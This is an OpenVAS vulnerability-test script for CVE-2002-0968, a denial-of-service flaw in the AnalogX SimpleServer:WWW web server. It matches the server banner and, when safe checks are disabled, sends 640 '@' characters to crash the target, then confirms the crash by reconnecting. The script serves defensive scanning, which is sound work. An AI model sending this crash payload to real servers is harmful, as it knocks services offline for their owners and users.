# OpenVAS Vulnerability Test
# Description: AnalogX SimpleServer:WWW  DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11035");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(5006);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0968");
  script_name("AnalogX SimpleServer:WWW  DoS");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_active");
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/simpleserver");

  script_tag(name:"solution", value:"Upgrade your software or use another HTTP server.");

  script_tag(name:"summary", value:"It was possible to kill the remote web server by sending 640 @
  character to it.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash continuously,
  preventing it from working properly.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(! banner || !egrep(pattern:"^Server: *SimpleServer:WWW", string:banner))
  exit(0);

if(safe_checks()) {
  if(egrep(pattern:"^Server: *SimpleServer:WWW/1.[01]", string:banner)) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:string(crap(length:640, data:"@"), "\r\n\r\n"));
http_recv(socket:soc);
close(soc);

soc = open_sock_tcp(port);
if(soc){
  close(soc);
  exit(0);
}

security_message(port:port);